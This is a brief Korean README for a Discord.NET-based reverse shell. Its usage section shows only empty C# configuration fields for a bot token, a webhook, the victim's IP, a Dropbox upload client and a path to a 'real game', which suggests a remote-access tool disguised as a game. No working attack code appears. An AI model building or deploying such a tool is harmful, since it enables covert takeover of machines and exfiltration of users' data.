
Discord.NET 을 이용한 reverse shell
##Usage

```C# 8
private static GET GET = new GET();
// 본 프로그램의 이름
public string filename = "";
// 실제 게임의 위치
public string path = "";
// 프로그램 버전
public string version = " | 2.23v";
// 디스코드 봇 토큰
public string bot_token = "";
// 웹훅링크
public string EndPoint =
@"";
// ip
public string ip = GET.ip();
// 드랍박스 연결
public DropboxClient dropbox_ = new DropboxClient(
                                      oauth2RefreshToken: "",
                                      appKey: "",
                                      appSecret: "");
// 웹에 post를 보내기위한 HttpClient선언
public HttpClient client_ = new HttpClient();
```
